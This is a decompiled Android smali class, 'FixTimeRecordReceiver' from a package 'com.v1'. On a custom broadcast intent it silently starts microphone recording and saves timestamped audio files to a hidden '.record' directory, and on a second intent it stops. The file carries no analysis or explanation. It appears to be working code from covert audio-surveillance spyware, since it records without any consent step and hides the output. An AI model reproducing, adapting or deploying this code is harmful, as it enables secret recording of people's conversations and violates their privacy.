.class public Lcom/v1/FixTimeRecordReceiver;
.super Landroid/content/BroadcastReceiver;


# static fields
.field private static a:Landroid/media/MediaRecorder;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 7

    const/4 v6, 0x0

    const/4 v5, 0x0

    const/4 v2, 0x1

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    const-string v1, "android.intent.action.DSJT_START"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    sget-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    if-eqz v0, :cond_0

    sget-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    sget-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    sput-object v6, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    sput-boolean v5, Lcom/v1/StreamService;->e:Z

    :cond_0
    new-instance v0, Landroid/media/MediaRecorder;

    invoke-direct {v0}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0, v2}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    sget-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0, v2}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    sget-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0, v2}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "FIX_TIME_"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-instance v1, Ljava/text/SimpleDateFormat;

    const-string v2, "yyyyMMddHHmmss"

    invoke-direct {v1, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/util/Date;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-direct {v2, v3, v4}, Ljava/util/Date;-><init>(J)V

    invoke-virtual {v1, v2}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/io/File;

    const-string v2, "/data/data/com.v1/.record/"

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->mkdirs()Z

    sget-object v1, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "/data/data/com.v1/.record/"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ".amr"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    :try_start_0
    sget-boolean v0, Lcom/v1/StreamService;->e:Z

    if-nez v0, :cond_1

    sget-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V

    sget-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/v1/StreamService;->e:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    :goto_0
    return-void

    :catch_0
    move-exception v0

    sput-boolean v5, Lcom/v1/StreamService;->e:Z

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    sget-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    sget-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->reset()V

    sget-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    sput-object v6, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    goto :goto_0

    :cond_2
    const-string v1, "android.intent.action.DSJT_STOP"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    sget-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    if-eqz v0, :cond_1

    sget-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    sget-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->reset()V

    sget-object v0, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    sput-object v6, Lcom/v1/FixTimeRecordReceiver;->a:Landroid/media/MediaRecorder;

    sput-boolean v5, Lcom/v1/StreamService;->e:Z

    goto :goto_0
.end method
